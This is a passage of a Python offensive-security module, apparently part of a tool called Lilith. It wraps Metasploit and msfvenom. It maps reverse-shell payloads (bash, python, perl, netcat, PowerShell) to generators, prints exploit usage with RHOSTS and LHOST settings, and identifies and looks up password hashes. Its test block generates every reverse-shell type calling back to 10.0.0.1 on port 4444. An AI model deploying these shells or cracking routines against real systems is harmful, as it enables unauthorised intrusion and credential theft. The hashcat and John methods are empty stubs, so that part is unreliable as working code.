                return {'success': False, 'error': result.stderr}
        except Exception as e:
            return self._generate_manual_payload(payload, lhost, lport, format)
    
    def _generate_manual_payload(self, payload: str, lhost: str, lport: int, format: str) -> Dict:
        """Generate payload manually without msfvenom"""
        
        # Map msfvenom payloads to our templates
        mapping = {
            'cmd/unix/reverse_bash': ('bash', 'reverse_tcp'),
            'cmd/unix/reverse_python': ('python', 'reverse_tcp'),
            'cmd/unix/reverse_perl': ('perl', 'reverse_tcp'),
            'cmd/unix/reverse_netcat': ('netcat', 'reverse_tcp'),
            'windows/shell_reverse_tcp': ('powershell', 'reverse_tcp'),
        }
        
        platform, ptype = mapping.get(payload, ('bash', 'reverse_tcp'))
        
        return self.generate_payload(ptype, lhost, lport, platform)
    
    def get_exploit_info(self, exploit_name: str) -> Dict:
        """Get detailed exploit information"""
        for platform, exploits in self.EXPLOITS.items():
            for exploit in exploits:
                if exploit['name'] == exploit_name:
                    return {
                        'success': True,
                        'exploit': exploit,
                        'platform': platform,
                        'options': {
                            'RHOSTS': 'Target IP address',
                            'RPORT': 'Target port',
                            'LHOST': 'Local IP for reverse connection',
                            'LPORT': 'Local port for reverse connection'
                        },
                        'example': f"use {exploit_name}\nset RHOSTS <target>\nset LHOST <your_ip>\nexploit"
                    }
        
        return {'success': False, 'error': f'Exploit not found: {exploit_name}'}


class EnhancedHashCracker:
    """Enhanced hash cracking with multiple methods"""
    
    HASH_PATTERNS = {
        32: [('MD5', 0), ('NTLM', 1000), ('MD4', 900)],
        40: [('SHA-1', 100), ('MySQL5', 300)],
        64: [('SHA-256', 1400), ('SHA3-256', 17400)],
        96: [('SHA-384', 10800)],
        128: [('SHA-512', 1700), ('SHA3-512', 17600)],
    }
    
    def __init__(self):
        self.hashcat_path = shutil.which('hashcat')
        self.john_path = shutil.which('john')
    
    def identify_hash(self, hash_value: str) -> Dict:
        """Identify hash type"""
        length = len(hash_value)
        
        # Check prefixes
        if hash_value.startswith('$2a$') or hash_value.startswith('$2b$') or hash_value.startswith('$2y$'):
            return {'success': True, 'type': 'bcrypt', 'hashcat_mode': 3200, 'difficulty': 'HIGH'}
        if hash_value.startswith('$6$'):
            return {'success': True, 'type': 'SHA-512 (Unix)', 'hashcat_mode': 1800, 'difficulty': 'HIGH'}
        if hash_value.startswith('$5$'):
            return {'success': True, 'type': 'SHA-256 (Unix)', 'hashcat_mode': 7400, 'difficulty': 'MEDIUM'}
        if hash_value.startswith('$1$'):
            return {'success': True, 'type': 'MD5crypt', 'hashcat_mode': 500, 'difficulty': 'MEDIUM'}
        if hash_value.startswith('$apr1$'):
            return {'success': True, 'type': 'Apache MD5', 'hashcat_mode': 1600, 'difficulty': 'MEDIUM'}
        
        # Check by length
        if length in self.HASH_PATTERNS:
            types = self.HASH_PATTERNS[length]
            return {
                'success': True,
                'length': length,
                'possible_types': [{'name': t[0], 'hashcat_mode': t[1]} for t in types],
                'most_likely': types[0][0]
            }
        
        return {'success': True, 'type': 'Unknown', 'length': length}
    
    def crack_hash(self, hash_value: str, mode: int = 0, wordlist: str = None) -> Dict:
        """Attempt to crack hash"""
        
        # Quick check common hashes first
        common = self._check_common_hashes(hash_value)
        if common:
            return {
                'success': True,
                'cracked': True,
                'plaintext': common,
                'method': 'common_hash_lookup'
            }
        
        if self.hashcat_path:
            return self._crack_with_hashcat(hash_value, mode, wordlist)
        elif self.john_path:
            return self._crack_with_john(hash_value, wordlist)
        else:
            return {
                'success': True,
                'cracked': False,
                'message': 'No cracking tools available',
                'online_resources': [
                    'https://crackstation.net/',
                    'https://hashes.com/en/decrypt/hash',
                    'https://hashtoolkit.com/'
                ]
            }
    
    def _check_common_hashes(self, hash_value: str) -> Optional[str]:
        """Check against common hash database"""
        common_md5 = {
            'd41d8cd98f00b204e9800998ecf8427e': '',
            '098f6bcd4621d373cade4e832627b4f6': 'test',
            '5d41402abc4b2a76b9719d911017c592': 'hello',
            'e10adc3949ba59abbe56e057f20f883e': '123456',
            '25f9e794323b453885f5181f1b624d0b': '123456789',
            'd8578edf8458ce06fbc5bb76a58c5ca4': 'qwerty',
            '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
            '0192023a7bbd73250516f069df18b500': 'admin123',
        }
        
        return common_md5.get(hash_value.lower())
    
    def _crack_with_hashcat(self, hash_value: str, mode: int, wordlist: str) -> Dict:
        """Use hashcat for cracking"""
        # Implementation similar to existing
        pass
    
    def _crack_with_john(self, hash_value: str, wordlist: str) -> Dict:
        """Use John the Ripper for cracking"""
        # Implementation similar to existing
        pass


# Singleton instances
_packet_capture = None
_arp_scanner = None
_metasploit = None
_hash_cracker = None


def get_packet_capture(interface: str = None) -> EnhancedPacketCapture:
    global _packet_capture
    if _packet_capture is None or (interface and _packet_capture.interface != interface):
        _packet_capture = EnhancedPacketCapture(interface)
    return _packet_capture


def get_arp_scanner(interface: str = None) -> EnhancedARPScanner:
    global _arp_scanner
    if _arp_scanner is None:
        _arp_scanner = EnhancedARPScanner(interface)
    return _arp_scanner


def get_metasploit() -> MetasploitFramework:
    global _metasploit
    if _metasploit is None:
        _metasploit = MetasploitFramework()
    return _metasploit


def get_hash_cracker() -> EnhancedHashCracker:
    global _hash_cracker
    if _hash_cracker is None:
        _hash_cracker = EnhancedHashCracker()
    return _hash_cracker


if __name__ == '__main__':
    print("=" * 60)
    print("LILITH ENHANCED NETWORK & METASPLOIT MODULE")
    print("=" * 60)
    
    # Test Metasploit
    msf = get_metasploit()
    print("\n[Metasploit] Exploit count:", len(msf.search_exploits()['exploits']))
    
    # Generate shells
    shells = msf.generate_all_shells("10.0.0.1", 4444)
    print(f"[Metasploit] Generated {len(shells['shells'])} shell types")
    
    # Test packet capture status
    cap = get_packet_capture()
    print(f"\n[Capture] Scapy available: {SCAPY_AVAILABLE}")
    print(f"[Capture] Interface: {cap.interface}")
    
    # Test ARP scanner
    arp = get_arp_scanner()
    print(f"\n[ARP] Scanner ready on: {arp.interface}")
